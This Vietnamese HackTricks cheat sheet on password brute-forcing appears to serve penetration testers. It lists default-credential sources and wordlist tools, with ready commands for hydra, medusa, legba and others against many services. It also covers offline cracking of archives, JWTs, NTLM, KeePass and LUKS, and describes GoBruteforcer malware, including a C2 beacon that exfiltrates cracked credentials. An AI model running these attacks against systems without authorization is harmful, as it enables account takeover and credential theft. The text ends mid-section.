# Brute Force - CheatSheet

{{#include ../banners/hacktricks-training.md}}

## Thông tin đăng nhập mặc định

**Tìm kiếm trên Google** thông tin đăng nhập mặc định của công nghệ đang được sử dụng hoặc **thử các liên kết sau**:

- [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
- [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
- [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
- [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
- [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
- [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
- [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
- [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
- [**https://many-passwords.github.io/**](https://many-passwords.github.io)
- [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Tạo từ điển của riêng bạn**

Tìm càng nhiều thông tin về mục tiêu càng tốt và tạo một từ điển tùy chỉnh. Các công cụ có thể hữu ích:

### Crunch

```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```

### Wordlist dựa trên website

```bash
# Cewl gets words from the victims page
cewl example.com -m 5 -w words.txt

# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
cat /path/to/urls.txt | tok

# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
cat /path/to/js-urls.txt | python3 getjswords.py
```

### [CUPP](https://github.com/Mebus/cupp)

Tạo mật khẩu dựa trên thông tin bạn biết về nạn nhân (tên, ngày tháng...)

```
python3 cupp.py -h
```

### [Wister](https://github.com/cycurity/wister)

Một công cụ tạo wordlist cho phép bạn cung cấp một tập hợp từ, sau đó tạo nhiều biến thể từ những từ đó để tạo ra một wordlist độc đáo và phù hợp để sử dụng với một mục tiêu cụ thể.

```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

 __          _______  _____ _______ ______ _____
 \ \        / /_   _|/ ____|__   __|  ____|  __ \
  \ \  /\  / /  | | | (___    | |  | |__  | |__) |
   \ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
    \  /\  /   _| |_ ____) |  | |  | |____| | \ \
     \/  \/   |_____|_____/   |_|  |______|_|  \_\

      Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```

### [pydictor](https://github.com/LandGrey/pydictor)

### Danh sách từ

- [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
- [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
- [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
- [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
- [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
- [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
- [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
- [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
- [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
- [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

## Quy trình bruteforce trên phạm vi Internet (bài học từ các scanner viết bằng Go)

Các hành vi sau được quan sát trong quy trình quét của malware GoBruteforcer; giá trị chính xác tùy theo từng mẫu.<sup>[[1]](#references)</sup>

- Duy trì **các nhóm worker được tinh chỉnh theo kiến trúc** (ví dụ: 95 worker chạy đồng thời trên `x86_64/arm64`, 85 trên `i686`, 35 trên `armv5tel` và mặc định là 50 trên các kiến trúc khác), kiểm tra số worker đang hoạt động mỗi giây và tạo worker thay thế khi số lượng thấp hơn mục tiêu; mỗi worker xử lý tối đa một IP mục tiêu rồi thoát.
- Tạo **các địa chỉ IPv4 công cộng ngẫu nhiên**, nhưng loại bỏ các dải không thể định tuyến rõ ràng và một số dải mà operator chọn tránh: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, các `/8` có nhiều cloud (`3/15/16/56`) và các `/8` liên quan đến Bộ Quốc phòng Hoa Kỳ (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
- **Kiểm tra cổng dịch vụ** với thời gian chờ ngắn (~2s) trước khi thử **đăng nhập cleartext** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin qua HTTP/80) và dùng **danh sách thông tin xác thực nhỏ tích hợp sẵn** nếu không lấy được thông tin xác thực từ C2.
- **Exfiltrate các mục tiêu trúng** qua các beacon HTTP GET nhỏ, chẳng hạn `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (mã dịch vụ như `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), đồng thời dùng lại một User-Agent trình duyệt phổ biến để trà trộn.
- **phpMyAdmin spray** có thể bruteforce khoảng 80 đường dẫn có khả năng tồn tại bằng `GET /index.php?lang=en`, phát hiện dấu hiệu PMA (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) và phân tích `codemirror.css?v=X.Y.Z` để chọn nhánh xác thực: phiên bản `<4.9` chấp nhận tham số GET `pma_username`/`pma_password`; phiên bản `>=4.9` dùng POST với `server=1`, CSRF `token` và cùng thông tin xác thực.

## Dịch vụ

Sắp xếp theo thứ tự bảng chữ cái của tên dịch vụ.

### AFP

```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```

### AJP

```bash
nmap --script ajp-brute -p 8009 <IP>
```

### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM và Solace)

```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```

### Cassandra

```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```

### ClickHouse

[bruter](https://github.com/vflame6/bruter)

```bash
bruter clickhouse -u default -p passwords.txt localhost:9000
```

### CouchDB

```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```

### Docker Registry

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```

### Elasticsearch

```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```

### FTP

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```

### HTTP Generic Brute

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basic Auth

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```

### HTTP - NTLM

```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```

### HTTP - Biểu mẫu POST

```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```

Với http**s**, bạn phải đổi từ "http-post-form" thành "**https-post-form"

### **HTTP - CMS --** (W)ordpress, (J)oomla hoặc (D)rupal hoặc (M)oodle

```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```

### IMAP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```

### IRC

```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```

### ISCSI

```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```

### JWT

```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```

### LDAP

```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```

### MQTT

```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```

### Mongo

```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```

### MSSQL

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```

### MySQL

```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```

### OracleSQL

```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```

Để sử dụng **oracle_login** với **patator**, bạn cần **cài đặt**:

```bash
pip3 install cx_Oracle --upgrade
```

[Brute force hash OracleSQL ngoại tuyến](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** and **11.2.0.3**):

```bash
 nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```

### POP

```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```

### PostgreSQL

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```

### PPTP

Bạn có thể tải gói `.deb` để cài đặt từ [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)

```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```

### RDP

```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```

### Redis

```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```

### Rexec

Để biết hành vi của dịch vụ Rexec xác thực bằng mật khẩu, xem [Pentesting Rexec (512/TCP)](../network-services-pentesting/512-pentesting-rexec.md).

```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```

### Rlogin

Để biết về xác thực trusted-host và truy cập terminal, xem [Pentesting Rlogin (513/TCP)](../network-services-pentesting/pentesting-rlogin.md#rlogin-513tcp).

```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```

### Rsh

Để tìm hiểu về xác thực trusted-host và các lệnh từ xa, xem [Pentesting Rsh (514/TCP)](../network-services-pentesting/pentesting-rlogin.md#rsh-514tcp).

```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```

[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```

### RTSP

```bash
hydra -l root -P passwords.txt <IP> rtsp
```

### SFTP

```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

### SNMP

```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```

### SMB

```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```

### SMPP

```bash
bruter smpp -u smppclient1 -p passwords.txt localhost:2775
```

### SMTP

```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```

### SOCKS

```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```

### SQL Server

```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```

### SSH

```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```

#### SSH key yếu / PRNG có thể dự đoán của Debian

Một số hệ thống có lỗi đã biết trong seed ngẫu nhiên được dùng để tạo vật liệu mật mã. Điều này có thể làm giảm đáng kể keyspace, khiến khóa có thể bị brute-force bằng các công cụ như [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Các bộ khóa yếu được tạo sẵn cũng có sẵn, chẳng hạn như [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ và OpenMQ)

Giao thức văn bản STOMP là một giao thức nhắn tin được sử dụng rộng rãi, **cho phép giao tiếp và tương tác liền mạch với các dịch vụ hàng đợi tin nhắn phổ biến** như RabbitMQ, ActiveMQ, HornetQ và OpenMQ. Giao thức này cung cấp phương thức tiêu chuẩn hóa và hiệu quả để trao đổi tin nhắn cũng như thực hiện nhiều thao tác nhắn tin khác nhau.

```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```

### Telnet

```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
    --username admin \
    --password wordlists/passwords.txt \
    --target localhost:23 \
    --telnet-user-prompt "login: " \
    --telnet-pass-prompt "Password: " \
    --telnet-prompt ":~$ " \
    --single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```

### VNC

```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```

### Winrm

```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```


## Cục bộ

### Cơ sở dữ liệu cracking trực tuyến

- [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
- [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 có hoặc không có ESS/SSP và với giá trị challenge bất kỳ)
- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, bản capture WPA2 và các tệp lưu trữ MSOffice, ZIP, PDF...)
- [https://crackstation.net/](https://crackstation.net) (Hashes)
- [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
- [https://gpuhash.me/](https://gpuhash.me) (Hashes và hash của tệp)
- [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
- [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
- [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
- [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
- [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Hãy xem thử công cụ này trước khi tìm cách brute force một Hash.

### ZIP

```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```

#### Known plaintext zip attack

Bạn cần biết **plaintext** (hoặc một phần plaintext) **của một tệp nằm bên trong** zip đã mã hóa. Bạn có thể kiểm tra **tên tệp và kích thước của các tệp nằm bên trong** zip đã mã hóa bằng cách chạy: **`7z l encrypted.zip`**\
Tải [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)từ trang releases.

```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```

### 7z

```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```

### PDF

```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```

### Mật khẩu Owner của PDF

Để crack mật khẩu Owner của PDF, hãy xem: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT

```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```

### NTLM cracking

```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```

### Keepass

```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

### Keberoasting

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Ảnh Lucks

#### Phương pháp 1

Cài đặt: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)

```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

#### Method 2

```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```

Một hướng dẫn BF Luks khác: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql

```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

### Khóa riêng PGP/GPG

```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

### Cisco

<figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Dùng [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py), sau đó dùng john

### Cột được bảo vệ bằng mật khẩu trong Open Office

Nếu bạn có tệp xlsx với một cột được bảo vệ bằng mật khẩu, bạn có thể bỏ bảo vệ cột đó:

- **Tải tệp lên Google Drive** và mật khẩu sẽ tự động bị xóa
- Để **xóa** mật khẩu **thủ công**:

```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```

### Chứng chỉ PFX

```bash
# From https://github.com/Ridter/p12tool
